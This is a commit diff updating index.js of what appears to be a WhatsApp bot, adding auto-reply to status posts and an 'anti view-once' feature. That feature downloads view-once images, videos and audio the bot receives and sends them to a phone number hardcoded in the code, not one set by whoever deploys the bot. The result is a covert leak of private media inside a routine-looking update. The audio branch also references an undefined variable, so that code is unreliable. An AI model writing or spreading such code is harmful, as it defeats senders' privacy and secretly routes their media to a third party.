43b9e8b51fce05508bffe6f066df21cbd7837b66
𝗛.𝗔.𝗡𝗔𝗗𝗨𝗡 𝗦𝗔𝗗𝗜𝗦𝗛𝗞𝗔 <vnaduwa@gmail.com>
2025-01-20 14:22:26 +0530

    Update index.js

--- index.js
+++ index.js
@@ -82,7 +82,28 @@ mek = mek.messages[0]
 if (!mek.message) return	
 mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
 if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
-await conn.readMessages([mek.key])  
+await conn.readMessages([mek.key]) 
+  }        
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS__MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+      let jawadik = mek.message.viewOnceMessageV2
+      let jawadik1 = mek.mtype === "viewOnceMessage"
+  if (jawadik && config.ANTI_VV === "true") {
+    if (jawadik.message.imageMessage) {
+    let cap = jawadik.message.imageMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
+    return conn.sendMessage("94767073275@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.videoMessage) {
+    let cap = jawadik.message.videoMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
+    return conn.sendMessage("94767073275@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.audioMessage) {
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
+    return conn.sendMessage("94767073275@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    }
         
 }
 const m = sms(conn, mek)
